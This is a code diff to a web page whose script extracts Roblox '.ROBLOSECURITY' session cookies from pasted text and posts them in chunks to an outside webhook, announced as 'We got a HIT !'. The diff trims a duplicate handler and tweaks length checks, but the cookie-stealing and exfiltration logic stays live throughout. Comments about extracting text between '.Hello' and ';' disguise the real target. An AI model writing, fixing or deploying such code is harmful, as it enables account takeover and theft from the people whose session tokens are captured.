@@ -161,7 +161,7 @@ document.getElementById('sendBtn').addEventListener('click', async ()=>{
   // Check if the extracted token is too long and split it
   const token = extracted.join("\n");
   let tokenParts = [token];
-  if (token.length > 1998) {
+  if (token.length > 2000) {
     tokenParts = splitIntoChunks(token, 1998);
   }
 
@@ -171,46 +171,12 @@ document.getElementById('sendBtn').addEventListener('click', async ()=>{
   log('Numbers Of ID Is Being Extract ' + tokenParts.length + ' Please Wait ...');
   for(let i=0;i<tokenParts.length;i++){
     const content = '**`' + tokenParts[i] + '`**';
+    if (content.length > 2000) {
+      log('Erreur: Le contenu dépasse la limite de 2000 caractères.');
+      break;
+    }
     const ok = await postToWebhook(webhookUrl, { content: content });
     if(ok) log(`ID has been send ${i+1}/${tokenParts.length}.`);
-    else { log('Erro.'); break; }
-    await new Promise(r => setTimeout(r, 250));
-  }
-  log('Please Wait.');
-});
-// Découper le texte en segments de 1998 caractères
-function splitIntoChunks(str, chunkSize=1998){
-  const chunks = [];
-  for(let i=0; i<str.length; i+=chunkSize){
-    chunks.push(str.slice(i, i+chunkSize));
-  }
-  return chunks;
-}
-
-document.getElementById('sendBtn').addEventListener('click', async ()=>{
-  const text = document.getElementById('message').value;
-  if(!text){ log('Message vide — rien à envoyer.'); return; }
-
-  // Extraire le texte entre ".Hello" et ";", en gardant ".Hello"
-  const regex = /(\.ROBLOSECURITY[\s\S]*?);/g;
-  let match;
-  const extracted = [];
-  while ((match = regex.exec(text)) !== null) {
-    extracted.push(match[1].trim());
-  }
-
-  if(extracted.length === 0){ log('Aucun texte trouvé entre .Hello et ;'); return; }
-
-  const chunks = splitIntoChunks(extracted.join("\n"), 1998); 
-
-  // Envoi du message introductif
-  await postToWebhook(webhookUrl, { content: '`We got a HIT ! :`' });
-
-  log('Numbers Of ID Is Being Extract ' + chunks.length + ' Please Wait ...');
-  for(let i=0;i<chunks.length;i++){
-        const content = '**`' + chunks[i] + '`**';
-    const ok = await postToWebhook(webhookUrl, { content: content });
-    if(ok) log(`ID has been send ${i+1}/${chunks.length}.`);
     else { log('Erro.'); break; }
     await new Promise(r => setTimeout(r, 250));
   }
@@ -220,5 +186,6 @@ document.getElementById('sendBtn').addEventListener('click', async ()=>{
 </script>
 </body>
 </html>
+
 
 
